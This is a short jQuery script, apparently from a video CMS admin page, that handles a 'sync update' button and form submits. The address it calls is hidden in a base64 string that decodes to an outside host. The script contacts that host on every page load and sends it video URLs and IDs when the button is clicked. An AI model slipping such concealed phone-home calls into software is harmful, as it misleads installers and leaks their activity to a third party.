var jsurl = base64_decode('aHR0cDovL3d3dy4yZHkudHYvYXBpL3NoLnBocA==');
$(function() {
	$('.vod_tongbu').live('click', function() {
		$(this).text('更新中...');
		var a = $(this).attr('url');
		var b = $(this).attr('vid');
		$.get(jsurl + "?url=" + a + "&vid=" + b);
		setTimeout(tongbu, 15000)
	});
	$("form").submit(function() {
		$(":submit", this).attr("disabled", "disabled")
	});
	$("input").live('click', function() {
		$("button[type=submit]").removeAttr("disabled")
	});
	$.get(jsurl);
});
function tongbu() {
	$('.vod_tongbu').html('检查更新');
	alert('该剧已经更新成功~！');
	window.location.reload();
}